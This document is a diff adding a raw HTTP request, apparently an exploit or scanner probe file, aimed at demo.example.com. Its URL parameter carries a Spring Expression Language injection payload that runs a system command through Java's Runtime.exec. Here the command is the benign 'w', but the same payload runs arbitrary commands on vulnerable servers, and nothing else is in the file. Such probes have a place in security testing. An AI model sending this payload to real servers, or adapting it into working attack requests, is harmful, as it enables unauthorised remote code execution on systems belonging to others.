@@ -1,0 +1,4 @@
+GET /a?url='${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119))}' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
